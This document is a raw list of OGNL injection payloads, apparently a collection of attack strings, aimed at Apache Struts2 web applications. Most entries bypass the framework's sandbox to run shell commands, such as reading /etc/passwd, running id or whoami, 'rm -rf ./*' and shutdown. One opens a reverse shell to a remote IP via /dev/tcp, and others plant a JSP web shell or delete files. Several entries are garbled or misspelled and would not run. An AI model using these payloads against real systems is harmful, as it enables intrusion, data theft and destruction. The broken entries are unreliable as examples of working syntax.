# payload 汇总

* %{#a=@java.lang.Thread@currentThread().getThreadGroup(),#b=#a,#c=#b.getParent(),#env = '',#while = "#b=#c,#c=#c.getParent(),(#up)(#env)",#up = "(#c != null)?(#while)(#env):1",#b.stop()}
* Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
* %{#_memberAccess.allowStaticMethodAccess=true,   #context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
* %{@java.lang.System@getProperty()}
* %{ #_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.ThreadGroup@destory()}
* %{ #_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Thread@sleep()}
* %{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@com.atlassian.core.util.ClassHelper@instantiateClass(a,b)}
* %{#a = new java.lang.ThreadLocal(@Override  protected ConnectioninitialValu(){return createConnection();})a.initialValue()}
* %{#a = @java.lang.Package@getPackage("")}
* %{#a = @java.lang.ClassLoader@a}
* %{#_memberAccess.allowStaticMethodAccess=true,   #context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
* %{@java.lang.System@getProperty()}
* %{ #_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.ThreadGroup@destory()}
* %{ #_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Thread@sleep()}
* %{@java.lang.Shutdown@exit()}
* %{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,#a = new java.lang.ThreadLocal(@Override  protected Connection initialValue() { return createConnection();})a.initialValue()}
* %{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,#a = @java.lang.Package@getPackage("")}
* %{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,#a = @java.lang.ClassLoader@a}
* %{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,#a = @com.atlassian.core.util.ClassLoaderUtilsloadClass@loadClass(a,b)}
* %{@java.lang.Runtime@getRuntime().exit(1)} 
* %{@java.lang.Runtime@getRuntime().halt(1)} 
* %{@java.lang.System@exit(1)} 
* %{@java.lang.System@getProperty('os.name')} 
* %{#f=new java.io.File("C:\\Users\\hp\\Desktop\\关键字1.txt"),#f.delete()}
* %{#f=new java.io.FileReader("C:\\Users\\hp\\Desktop\\关键字.txt"),#a = new char[1024],#f.read(#a,0,1024),new java.lang.String(#a)}
* %{(new java.io.File("C:\\Users\\hp\\Desktop\\关键字2.txt")).createNewFile()}
* %{@java.lang.Thread@currentThread().stop()}
* %{#a = @com.sun.management.DiagnosticCommandMBean}
* %{#a = new com.sun.management.DiagnosticCommandMBean()}
* %{#a = @org.apache.catalina.session.JMSContext}
* %{#a = new org.apache.catalina.session.JMSContext()}
* %{#a = new javax.sql.rowset.RowSetMetaDataImpl()}
* %{#a = @javax.sql.rowset.RowSetMetaDataImpl}
* %{#a = new java.nio.channels.Pipe()}
* %{#a = @java.nio.channels.Pipe}
* %{#a = @sun.invoke.Empty}
* %{#a = new sun.invoke.Empty()}
* %{#a = new java.util.zip.DeflaterInputStream()}
* %{#a =@java.util.zip.ZipFile@CENATT }
* %{#a =@java.net.Authenticator}
* %{#a =new java.net.Authenticator()}
* %{#a =@sun.misc.Unsafe@getUnsafe()}
* %{#a =new java.util.concurrent.CountDownLatch()}
* %{#a =@java.util.concurrent.CountDownLatch}
* %{#a = new org.apache.catalina.session.StandardSession()} 
* %{#a = @org.apache.catalina.session.StandardSession} 
* %{#a =new com.atlassian.confluence.util.velocity.VelocityUtils()}
* %{#a =@com.atlassian.confluence.util.velocity.VelocityUtils()}
* %{#a =@com.google.common.reflect.Reflection}
* %{#a =new com.google.common.reflect.Reflection()}
* %{#a =new com.atlassian.sal.api.net.RequestFactory()}
* %{#a =@com.atlassian.sal.api.net.RequestFactory()}
* %{#a =@com.hazelcast.spi.Operation}
* %{#a =new com.hazelcast.spi.Operation}
* %{#a =@org.apache.commons.httpclient.HttpClient}
* %{#a =new org.apache.commons.httpclient.HttpClient()}
* %{#a =@com.atlassian.util.concurrent.LazyReference()}
* %{#a =new com.atlassian.util.concurrent.LazyReference()}
* %{#a =@freemarker.ext.jsp.TaglibFactory}
* %{#a =new freemarker.ext.jsp.TaglibFactory()}
* %{#a =new com.sun.jna.JniDispatch32()}
* %{#a =@com.sun.jna.JniDispatch32()}
* %{#a =new com.sun.corba.se.impl.encoding.CodeSetConversion()}
* %{#a =@com.sun.corba.se.impl.encoding.CodeSetConversion}
* %{#a =@com.sun.jmx.snmp.tasks.Task}
* %{#a =new com.sun.jmx.snmp.tasks.Task()}
* %{#a =new org.apache.commons.exec.CommandLine()}
* %{#a =@org.apache.commons.exec.CommandLine}
* %{#a =new java.lang.reflect.Constructor<T>().getDeclaringClass()}
* %{#a =new jcom.atlassian.util.concurrent.LazyReference()}
* %{#a =@com.atlassian.util.concurrent.LazyReference}
* %{#a=new java.io.File("~/test.txt"),#a.delete()}
* %{#a=new java.io.File("~/test.txt"),#a.setExecutable(true),#b=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "rm -rf ./*"})).start()}
* %{#a=new java.io.File("~"),#a.list()}
* %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "rm -rf ./*"})).start()}
* %{@java.lang.Runtime@getRuntime().exec("ls -als")}
* %{#a=new java.lang.Runtime().exec("rm -rf ./*")}
* %{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@sun.misc.Unsafe@getUnsafe()}
* %{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=@sun.misc.Unsafe.class.getDeclaredField("theUnsafe"),#f.setAccessible(true),#unsafe=#f.get(null)}
* %{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.String("test").getClass().getClassLoader()}
* %{@com.opensymphony.xwork.ActionContext@getContext()}
* %{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Compiler@disable()}
* %{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Compiler@compileClass(new java.lang.String("test").getClass())}
* %{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Compiler@command("javac java.lang.String")}
* %{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.String("test"),#a.getClass()}
* %{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.Process().destroy()}
* %{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.Package().getImplementationVendor()}
* %{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.Package().getImplementationTitle()}
* %{#a=new javax.script.ScriptEngineManager().getEngineByName().eval("println('hello!')")}
* %{#a=new javax.script.ScriptEngineManager().getBindings()}
* %{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new javax.persistence.EntityManager(){public void clear(){}.clear()}
* %{#em=@javax.persistence.Persistence@createEntityManagerFactory("test").createEntityManager(),#em.createQuery("select * from Student")}
* %{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext()}
* %{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext().setAttribute("test", "hello")}
* %{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext().getInitParameterNames()}
* %{#sc=@javax.servlet.http.HttpServletRequest.getSession().getServletContext().getResourceAsStream("~/test.txt")}
* %{@java.lang.ClassLoader@getSystemClassLoader()}
* %{#a=new java.lang.Runtime().exec("ls -las", new java.io.File("/"))}
* %{"userDir{" + @java.lang.System@getProperty("user.dir") + "}"} 
* %{"osName{" + @java.lang.System@getProperty("os.name") + "}"} 
* %{@java.lang.System@clearProperty("java.class.path")} 
* %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "head -3 /etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
* http://www.glassy.com/test.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(a)(b)&('\u0023_memberAccess.exclude\u003d@java.util.Collections@EMPTY_SET')(a)(b)&('\u0023_memberAccess.allowStaticMethodAccess\u003dfalse')(a)(b)&('\u0040java.lang.Runtime@getRuntime().exec(\'/bin/bash\u0020-c\u0020rm\u0020-rf\u0020./*\')')(a)(b)
* ${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('pwd').getInputStream()),#q}
* %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "ifconfig"})).start().getInputStream(),#b=new java.io.BufferedReader(new java.io.InputStreamReader(#a)),#c=new char[50000],#b.read(#c),#d=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#d.getWriter().println(new java.lang.String(#c)),#d.getWriter().flush(),#d.getWriter().close()}
* %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "ls -als"})).start().getInputStream(),#b=new java.io.BufferedReader(new java.io.InputStreamReader(#a)),#c=new char[50000],#b.read(#c),#d=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#d.getWriter().println(new java.lang.String(#c)),#d.getWriter().flush(),#d.getWriter().close()}
* %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "cd ~ && ls -als"})).start().getInputStream(),#b=new java.io.BufferedReader(new java.io.InputStreamReader(#a)),#c=new char[50000],#b.read(#c),#d=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#d.getWriter().println(new java.lang.String(#c)),#d.getWriter().flush(),#d.getWriter().close()}
* ${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),@java.lang.Runtime@getRuntime().exec('shutdown -h now')}
* %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("ls -a").getInputStream())).(#q)}
* %{#req=@org.apache.struts2.ServletActionContext@getRequest(), #response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
* %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
* %{('#_memberAccess[\'allowStaticMethodAccess\']')(vaaa)=true&(aaaa)(('#context[\'xwork.MethodAccessor.denyMethodExecution\']=#vccc')(#vccc=new java.lang.Boolean("false")))&(asdf)(('#rt.exec("touch@/tmp/success".split("@"))')(#rt=@java.lang.Runtime@getRuntime()))=1}
* %{('#_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(b))&('#c')(('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(c))&(g)(('#mycmd=\'whoami\'')(d))&(h)(('#myret=@java.lang.Runtime@getRuntime().exec(#mycmd)')(d))&(i)(('#mydat=new java.io.DataInputStream(#myret.getInputStream())')(d))&(j)(('#myres=new byte[51020]')(d))&(k)(('#mydat.readFully(#myres)')(d))&(l)(('#mystr=new java.lang.String(#myres)')(d))&(m)(('#myout=@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('#myout.getWriter().println(#mystr)')(d))}
* ' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream())) + '
* ?debug=command&expression=#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()?age=12313&name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&z[(name)(%27meh%27)]
* %{#a=(new+java.lang.ProcessBuilder(new+java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new+java.io.InputStreamReader(#b),#d=new+java.io.BufferedReader(#c),#e=new+char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new+java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
* ?xxx=${#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println('dbapp='+new java.lang.String(#d)),#out.close()}
* ?x=${(#context['xwork.MethodAccessor.denyMethodExecution']=false)(#_memberAccess['allowStaticMethodAccess']=true)(@java.lang.Runtime@getRuntime().exec("id"))}
* ${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#q}.action
* redirect:${#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("whoami").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}
* redirect:${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#ot=#resp.getWriter (),#ot.print('web'),#ot.print('path:'),#ot.print(#req.getSession().getServletContext().getRealPath('/')),#ot.flush(),#ot.close()}
* xxx.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&pp=\\A&ppp= &encoding=UTF-8&cmd=idContent-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
* "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
* %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
* <command> <string>bash</string> <string>-c</string> <string>bash -i >&amp; /dev/tcp/192.168.244.128/777 0>&amp;1</string> </command>
* %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
* ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
* %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.setExcludedPackageNames('')).(#ou.setExcludedClasses('')).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
* %{(#instancemanager=#application['org.apache.tomcat.InstanceManager']).(#stack=#request['struts.valueStack']).(#bean=#instancemanager.newInstance('org.apache.commons.collections.BeanMap')).(#bean.setBean(#stack)).(#context=#bean.get('context')).(#bean.setBean(#context)).(#macc=#bean.get('memberAccess')).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance('java.util.HashSet')).(#bean.put('excludedClasses',#emptyset)).(#bean.put('excludedPackageNames',#emptyset)).(#arglist=#instancemanager.newInstance('java.util.ArrayList')).(#arglist.add('id')).(#execute=#instancemanager.newInstance('freemarker.template.utility.Execute')).(#execute.exec(#arglist))}
* %{@java.lang.Runtime@getRuntime().exec('curl http://127.0.0.1:10000/')}
* %{(\"@java.lang.Runtime@getRuntime().exec(\'open /Applications/Calculator.app/\')\")(glassy)(amadeus)}
* ${(new java.lang.ProcessBuilder('calc')).start()}
* %{@java.lang.Runtime@getRuntime().exec("open /Applications/Calculator.app/")}
* %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
* http://www.glassy.com/test.action?('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(a)(b)&('@java.lang.Runtime@getRuntime().exec(\'open /Applications/Notes.app/\')')(a)(b)
* http://www.glassy.com/test.action?('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(a)(b)&('#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET')(a)(b)&('#_memberAccess.allowStaticMethodAccess=false')(a)(b)&('@java.lang.Runtime@getRuntime().exec(\'open /Applications/Notes.app/\')')(a)(b)
* user.name=glassy&user.age=12&user.birthDay='+(#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Runtime@getRuntime().exec('/Applications/Notes.app/Contents/MacOS/Notes'))+'&user.email=31312@qq.com
* %{@java.lang.Runtime@getRuntime().exec('open /Applications/Notes.app/')(glassy)}
* http://www.glassy.com/test.action?password=(#context["xwork.MethodAccessor.denyMethodExecution"]= new java.lang.Boolean(false), #_memberAccess["allowStaticMethodAccess"]= new java.lang.Boolean(true), @java.lang.Runtime@getRuntime().exec('/Applications/Notes.app/Contents/MacOS/Notes'))(meh)&z[(password)(meh)]=true
* %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "open /Applications/Notes.app/"})).start()}
* http://www.glassy.com/Struts2Demo_war_exploded/hello.jsp?fakeParam=%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "open /Applications/Notes.app/"})).start()}
* http://www.glassy.com/Struts2Demo_war_exploded/${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ifconfig').getInputStream()),#q}.action
* http://www.glassy.com/Struts2Demo_war_exploded/hello.action?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/bash', '-c','open /Applications/Notes.app/'})).start()}
* http://www.glassy.com/Struts2Demo_war_exploded/hello.action?debug=command&expression=#a=(new java.lang.ProcessBuilder('open /Applications/Notes.app/')).start()
* http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
* http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.prefix=shell
* http://127.0.0.1/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
* http://www.glassy.com/Struts2Demo_war_exploded/s2029.action?message=(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('open /Applications/Notes.app/').getInputStream()))
* http://www.glassy.com/struts2-showcase/home11.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]),d&cmd=/Applications/Notes.app/Contents/MacOS/Notes
* Content-Type:%{(#glassy='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new java.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())}
* Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"
* name=${(#glassy='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new java.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())}&age=11&__checkbox_bustedBefore=true&description=22
* http://www.glassy.com/Struts2Demo_war_exploded/s2053.action?name=%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new java.lang.ProcessBuilder('/Applications/Notes.app/Contents/MacOS/Notes')).start())}
* %{@java.lang.System.currentTimeMillis()}
* %{@java.lang.System.getProperty("a")}
* %{@java.lang.System.exit（）}
* %{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.ThreadGroup@destory()}
* %{@"java.lang.ProcessBuilder"}
* %{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.inheritableThreadlocal.get()  }
* %{@java.lang.shuntdown（）}
* %{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false, java.lang.ThreadLocal@remove()}
* %{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Process @waitfor()}
* %{@java.lang.Runtime"}
* %{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@Java.lang.Object @waitfor()}
* %{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.Class  @getEnclosingClass()}
* %{ #_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,@java.lang.ClassLoader @clearAssertionStatus()}
* %{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@javax.script.ScriptEngineManage@getEngineByName("JavaScript")}
* %{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@javax.persistence.EntityManager@remove("")}
* %{#_memberAccess.allowStaticMethodAccess=true,     #context["xwork.MethodAccessor.denyMethodExecution"]=false,@javax.servlet.ServletContext@removeAttribute(String name)}
* %{#memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS，@java.lang@avaoableProcessors()}
* %{@java.io.BufferedInputStream.close()}
* %{#_memberAccess.allowStaticMethodAccess=true  ,@java.io.BufferedInputStream@close()}
* %{#excludeProperties=@java.util.Collections@EMPTY_SET,@java.io.BufferedInputStream@close()}
* %{@java.io.BufferedOutputStream.Write(0)}
* %{#excludeProperties=@java.util.Collections@EMPTY_SET,@java.io.BufferedOutputStream.Write(5)}
* %{java.io.BufferedInputStream.Close()}
* %{#_memberAccess.allowStaticMethodAccess=true  ,java.io.BufferedInputStream@Close()}
* %{java.io.BufferedWriter.write(1)}
* %{#_memberAccess.allowStaticMethodAccess=true ,java.io.ByteArrayInputStream@close() }
* %{@java.io.ByteArrayOutputStream.write(256)}
* %{@java.io.CharArrayReader.read()}
* %{#_memberAccess['allowPrivateAccess']=true,@java.io.CharArrayWriter.append('c') }
* %{#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),java.io.Console@readPassword() }
* %{@java.io.DataInputStream.readUTF()}
* %{@java.io.BufferedInputStream.write(1) }
* %{@java.io.BufferedIoutStream.flush}
* %{@java.io.File.getCanonicalFile(C:\Windows\appcompat) }
* %{#excludeProperties=@java.util.Collections@EMPTY_SET,@Java.io.File@sync()}
* %{@java.io.FileInputStream.close()}
* %{@java.io.FileOutputStream.getFD()}
* %{#_memberAccess.allowStaticMethodAccess=true,@java.io.FileOutputStream@hashCode()}
* %{#excludeProperties=@java.util.Collections@EMPTY_SET,@java.io.FileOutputStream@hashCode() }
* %{@java.io.FilePermission.hashCode()}
* %{@java.io.FilterInputStream.close()}
